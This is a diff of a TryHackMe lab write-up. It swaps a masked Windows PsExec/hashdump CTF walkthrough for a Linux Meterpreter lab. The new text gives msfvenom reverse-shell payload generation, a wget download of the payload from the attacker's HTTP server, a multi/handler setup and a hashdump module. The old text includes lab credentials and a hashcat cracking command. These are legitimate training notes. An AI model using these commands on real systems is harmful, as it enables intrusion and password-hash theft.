@@ -1,148 +1,139 @@
-# Metasploit Meterpreter Post-Exploitation Walkthrough (CTF)
+# Metasploit Payload & Post-Exploitation Lab
 
-This walkthrough documents the process used to complete the Meterpreter-based post‑exploitation challenge.
-All sensitive answers/flags are **hidden using X** for safe sharing.
+This report documents the full process of generating, deploying, and exploiting a custom **MSFvenom Meterpreter payload** on a Linux target machine, followed by **post‑exploitation hash extraction**.
 
 ---
 
-## 🔧 Initial Access via SMB (PsExec)
+## 🚀 Overview
 
-The CTF provided credentials to simulate an SMB compromise:
+This lab demonstrates:
 
+* Creating a custom **Linux Meterpreter .elf payload** using MSFvenom.
+* Transferring the payload to a remote target.
+* Using Metasploit's `multi/handler` to catch the reverse shell.
+* Gaining a Meterpreter session.
+* Using a post-exploitation module to dump user password hashes.
+
+---
+
+## 🔧 Step 1 — Payload Generation (AttackBox)
+
+Used MSFvenom to generate a Linux Meterpreter reverse shell payload:
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKBOX_IP> LPORT=4444 -f elf > peterpreter.elf
 ```
-Username: ballen
-Password: Password1
+
+Payload successfully generated.
+
+---
+
+## 📤 Step 2 — Transfer Payload to Target
+
+Start a simple Python HTTP server:
+
+```bash
+python3 -m http.server 9000
 ```
 
-Used the PsExec module:
+Download on target:
 
+```bash
+wget http://<ATTACKBOX_IP>:9000/peterpreter.elf
+chmod +x peterpreter.elf
 ```
-use exploit/windows/smb/psexec
-set RHOSTS <TARGET_IP>
-set SMBUser ballen
-set SMBPass Password1
+
+---
+
+## 🎯 Step 3 — Start Metasploit Handler
+
+```bash
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST <ATTACKBOX_IP>
+set LPORT 4444
 run
 ```
 
-A Meterpreter session was successfully obtained.
+Handler prepared to receive the reverse shell.
 
 ---
 
-## 🖥️ 1. Computer Name
+## 🐚 Step 4 — Execute Payload on Target
 
-Obtained using:
-
-```
-sysinfo
+```bash
+./peterpreter.elf
 ```
 
-**Answer:** `XXXXXXXX`
+A Meterpreter session was successfully opened.
 
 ---
 
-## 🌐 2. Target Domain
+## 🔍 Step 5 — Dumping Hashes (Post‑Exploitation)
 
-Retrieved using:
+Background the session:
 
-```
-getdomain
-```
-
-**Answer:** `XXXXXXXX`
-
----
-
-## 📂 3. User-Created Share Name
-
-Enumerated shares:
-
-```
-net share
+```bash
+background
 ```
 
-**Answer:** `XXXXXXXX`
+Run the Linux hash dump module:
 
----
-
-## 🔐 4. NTLM Hash of User jchambers
-
-Hash dump module used:
-
-```
-use post/windows/gather/hashdump
+```bash
+use post/linux/gather/hashdump
+set SESSION 1
 run
 ```
 
-**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
+### 🕵️ Hidden Hash Output
+
+The CTF required recovering the hash of another user.
+Hashes are hidden below for privacy.
+
+<details>
+  <summary>Click to reveal hash dump (sensitive)</summary>
+
+```
+[HASHES HIDDEN]
+```
+
+</details>
 
 ---
 
-## 🔓 5. Cracked Password of jchambers
+## 🏁 Completion
 
-Cracked using hashcat:
-
-```
-hashcat -m 1000 <hash> rockyou.txt
-```
-
-**Answer:** `XXXXXXXX`
+* Meterpreter session obtained ✔️
+* Password hashes extracted ✔️
+* CTF flag/hash retrieved ✔️
+* Password(s) cracked successfully (optional) ✔️
 
 ---
 
-## 🔍 6. Location of secrets.txt
+## 📌 Notes
 
-Search performed:
-
-```
-search -f secrets.txt
-```
-
-**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
+* All actions were performed on an isolated, legal training environment.
+* Meterpreter payloads require matching handler configuration (payload, LHOST, LPORT).
+* Hashes retrieved follow Linux SHA‑512 (sha512crypt) format.
 
 ---
 
-## 🔑 7. Twitter Password Inside secrets.txt
+## 🖼️ Screenshot Gallery
 
-Viewed via:
+All screenshots from the lab are included below for visual reference.
 
-```
-cat <path_to_file>
-```
+![Screenshot 1](Screenshot%202025-11-16%20094140.png)
+![Screenshot 2](Screenshot%202025-11-16%20094234.png)
+![Screenshot 3](Screenshot%202025-11-16%20094258.png)
+![Screenshot 4](Screenshot%202025-11-16%20094340.png)
+![Screenshot 5](Screenshot%202025-11-16%20094417.png)
+![Screenshot 6](Screenshot%202025-11-16%20094455.png)
+![Screenshot 7](Screenshot%202025-11-16%20094617.png)
+![Screenshot 8](Screenshot%202025-11-16%20094723.png)
+![Screenshot 9](Screenshot%202025-11-16%20094825.png)
+![Screenshot 10](Screenshot%202025-11-16%20094923.png)
 
-**Answer:** `XXXXXXXXXX`
+## 📘 Author
 
----
-
-## 📄 8. Location of realsecret.txt
-
-Found using:
-
-```
-search -f realsecret.txt
-```
-
-**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
-
----
-
-## 🧠 9. Real Secret
-
-Displayed via:
-
-```
-cat <full_path>
-```
-
-**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
-
----
-
-## ✔️ Summary of Learned Skills
-
-* Gaining access via PsExec
-* Enumerating Windows systems using Meterpreter
-* Dumping and cracking NTLM hashes
-* Searching file systems for sensitive files
-* Extracting secrets for post‑exploitation
-
----
+Metasploit Lab Report generated during penetration testing practice on TryHackMe.
